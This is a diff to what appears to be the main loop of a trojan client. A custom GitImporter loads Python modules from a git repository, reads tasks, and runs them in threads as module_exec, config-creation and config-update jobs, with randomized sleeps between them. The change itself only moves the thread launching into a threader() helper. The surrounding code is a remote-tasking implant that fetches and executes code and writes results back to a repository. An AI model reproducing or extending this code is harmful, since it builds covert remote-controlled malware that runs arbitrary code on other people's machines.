@@ -116,6 +116,11 @@ class ClientHandler:
         
         self.repo.file_contents(self.config_path).update(message,bindata)
 
+def threader(func: object, task: str) -> None:
+    t = Thread(target=func, args=(task, ))
+    t.start()
+    sleep(randint(4,8))
+
 def main() -> None:
     sys.meta_path = [GitImporter()]
     
@@ -136,19 +141,14 @@ def main() -> None:
                     module_list.append(task['module'])
                     
                     if task['module'] == 'stage_1':
-                        t = Thread(target=client.create_client_config, args=(task['module'],))
-                        t.start()
-                        sleep(randint(3,6))
+                        threader(client.create_client_config, task['module'])
                     
                     elif 'qrw' in task['module']:
-                        t = Thread(target=client.update_client_config, args=(task['module'],))
-                        t.start()
-                        sleep(randint(5,10))
+                        threader(client.update_client_config, task['module'])
                     
                     else:
-                        t = Thread(target=client.module_exec, args=(task['module'],))
-                        t.start()
-                        sleep(randint(5,10))
+                        threader(client.module_exec, task['module'])
+
 
 if __name__=='__main__':
     main()
